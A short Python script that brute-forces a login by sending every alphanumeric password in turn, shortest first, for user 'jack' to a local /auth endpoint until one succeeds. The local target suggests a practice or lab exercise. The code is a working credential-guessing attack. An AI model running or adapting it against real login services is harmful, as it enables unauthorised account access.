import requests

alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
base = len(alphabet)

i = 0
length = 0

while True:
    # i 10 -> 16
    password = ''
    temp = i
    while temp > 0:
        c = temp // base
        r = temp % base
        password = alphabet[r] + password
        temp = c

    if len(password) < length:
        zeros_count = length - len(password)
        password = alphabet[0] * zeros_count + password

    # test password
    print('length', length, i, password)
    response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'jack', 'password': password})
    if response.status_code == 200:
        print('SUCCESS', password)
        break

    if password.count(alphabet[-1]) == length:
        length += 1
        i = 0
    else:
        i += 1

